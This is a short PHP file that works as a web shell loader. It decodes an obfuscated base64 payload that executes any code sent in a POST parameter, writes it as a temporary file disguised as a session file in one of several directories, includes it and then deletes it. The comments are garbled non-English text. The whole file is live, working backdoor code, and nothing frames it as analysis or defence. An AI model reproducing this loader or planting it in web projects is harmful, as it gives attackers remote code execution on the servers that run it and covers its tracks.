<?php

    $cfg_ml='PD9waHAgQGV2YWwoJF9QT1NUWydndWlnZSddKT8+';
    /*<?php @eval($_POST['guige'])?>*/

    $cfg_ml = base64_decode($cfg_ml);
    $t = md5(mt_rand(1,100));
    //��������ֿ��ܵ�Ŀ¼��д����ʱWEBSHELL�ļ�
    $f=$_SERVER['DOCUMENT_ROOT'].'/data/sessions/sess_'.$t;
    @file_put_contents($f,$cfg_ml);
    if(!file_exists($f))
    {    
        $f=$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        $f=$_SERVER['DOCUMENT_ROOT'].'/a/'.$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        //��ű����ڵ�ǰĿ¼��д����ʱWEBSHELL�ļ�
        $f=$_SERVER['DOCUMENT_ROOT'].'/'.$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        $f='/tmp/'.$t;
        @file_put_contents($f,$cfg_ml);
    } 
    //ͨ��include����֮ǰд�����ʱWEBSHELL�ļ�
    @include($f);
    @unlink($f);  

?>